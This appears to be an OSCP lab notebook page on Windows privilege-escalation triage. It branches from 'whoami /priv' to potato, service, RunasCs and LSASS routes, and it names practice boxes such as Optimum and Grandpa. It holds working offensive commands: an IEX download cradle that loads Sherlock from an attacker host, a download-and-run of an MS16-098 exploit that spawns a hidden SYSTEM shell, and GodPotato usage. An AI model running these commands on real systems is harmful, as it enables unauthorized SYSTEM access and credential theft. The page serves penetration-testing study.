# Windows - Privilege Triage

**Step 28 of 50 · Windows**

*Check enabled token privileges for a direct standalone Windows escalation path.*

## Run this

> **Why:** This lists privileges enabled in the current Windows token so a usable local escalation path can be selected instead of guessed.
```powershell
whoami /priv
```

## Example output

```

Privilege Name                  State
=============================  ========
SeImpersonatePrivilege         Enabled
SeAssignPrimaryTokenPrivilege  Disabled
...
```
## What did you get?

- [ ] SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege is enabled → **Go to Step 29 · [[Windows - SeImpersonate Abuse]]**
- [ ] SeBackupPrivilege is enabled → **Go to the AD backup path at Step 43A · [[AD - Backup Operators]]**
- [ ] SeDebugPrivilege is enabled → **Run `tasklist /v`, choose an approved privileged process, and go to Step 44A · [[AD - LSASS Parsing]] only if you have an authorized dump**
- [ ] No useful privilege is enabled → **Check inherited ACLs in Step 28A · [[Windows - Privesc - ACL Misconfiguration]], then continue to Step 31 · [[Windows - Scheduled Task Abuse]] or Step 30 · [[Windows - Service Abuse]]**
- [ ] Valid credentials exist but WinRM and RDP are unavailable → **Go to Step 28B · [[Windows - RunasCs]] and run `.\RunasCs.exe $Username2 $Password2 "cmd /c whoami"`**
- [ ] Account is a member of Server Operators → **Go to Step 30 · [[Windows - Service Abuse]] and run its `sc.exe config`, `sc.exe start`, and restore commands in order**

If `SeImpersonatePrivilege` is enabled and the first potato tool does not work, try GodPotato:

> **Why:** This command gathers the windows privilege triage evidence needed to decide which documented route applies next.
```powershell
.\GodPotato.exe -cmd "cmd /c whoami"
```

The command should return `nt authority\\system` before moving to SYSTEM-only collection.

## Old Windows kernel triage: Sherlock and processor prerequisites

Run `systeminfo` before selecting a historical kernel exploit. Record the exact OS build, architecture, installed hotfixes, and processor count, then load Sherlock in the same PowerShell process:

```powershell
systeminfo

IEX (New-Object Net.WebClient).DownloadString('http://$LocalIP:$TransferPort/Sherlock.ps1')

Find-AllVulns
```

Sherlock reports candidates, not guaranteed execution. In particular, MS16-032 can appear vulnerable but its runtime check fails on a single-processor host. Optimum used the clean callback shell to run the reviewed MS16-098 `bfill.exe` binary instead:

```powershell
(New-Object Net.WebClient).DownloadFile('http://$LocalIP:$TransferPort/bfill.exe', 'C:\Users\$Username\Desktop\bfill.exe')

C:\Users\$Username\Desktop\bfill.exe cmd.exe /c powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File C:\Users\$Username\Desktop\system-shell.ps1

whoami
```

Use a fresh listener for the elevated callback and run the binary from the native shell, not the original web-worker context. See [[OSCP/BOXES/WRITE UPS/Windows/Optimum|Optimum]].

## Legacy Windows kernel lane: MS14-058

For Windows Server 2003-era footholds, capture the exact system and patch context before choosing a kernel module:

```cmd
systeminfo
wmic qfe get HotFixID,InstalledOn
whoami /all
```

If the local exploit suggester identifies `ms14_058_track_popup_menu`, match the module to the OS build, architecture, and current session. Run it from a stable migrated session when the initial foothold came from a crash-based IIS worker. The successful proof is a new session whose `getuid` and `whoami` show `NT AUTHORITY\\SYSTEM`; a module that only reports a launch or process event is not enough.

> [!warning] 💡 Historical exploit candidates are not interchangeable
> MS14-058 is a distinct legacy Win32k route from MS16-032 and MS16-098. Do not choose a module from a generic “missing patches” list without checking its target build, architecture, token, and callback context.

## Notes

Only enabled privileges are immediate candidates.

## Gotcha

> [!warning] 💡
> Listed but disabled privileges are not enough on their own.

## External Resources

- [RunasCs](https://github.com/antonioCoco/RunasCs)
- [GodPotato](https://github.com/BeichenDream/GodPotato)
## Seen in
- *(no write-up yet)*
- [[OSCP/BOXES/WRITE UPS/Windows/Buff|Buff]] -- medium-integrity shaun triage and high-integrity Administrator confirmation
- [[OSCP/BOXES/WRITE UPS/Windows/Devel|Devel]] -- enabled SeImpersonatePrivilege on the IIS application-pool token
- [[OSCP/BOXES/WRITE UPS/Windows/Conceal|Conceal]] -- enabled SeImpersonatePrivilege confirmed through the FTP-uploaded ASP shell
- [[OSCP/BOXES/WRITE UPS/Windows/Bastard|Bastard]] -- IUSR token triage, x64 Server 2008 R2 fingerprint, and enabled SeImpersonatePrivilege
- [[OSCP/BOXES/WRITE UPS/Windows/Love|Love]] -- `phoebe` lacked admin membership and SeImpersonate, so both AlwaysInstallElevated policies became the escalation route
- [[OSCP/BOXES/WRITE UPS/Windows/Optimum|Optimum]] -- one-processor `systeminfo` gotcha, Sherlock candidate review, and MS16-098 selection from a clean callback
- [[OSCP/BOXES/WRITE UPS/Windows/Grandpa|Grandpa]] -- stable migrated Network Service session, local exploit-suggester review, and MS14-058 SYSTEM proof on legacy Windows

## Related stages

- [[Windows - Service Scan]]
- [[Windows - Web Enum]]
- [[Windows - SMB Enum]]
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
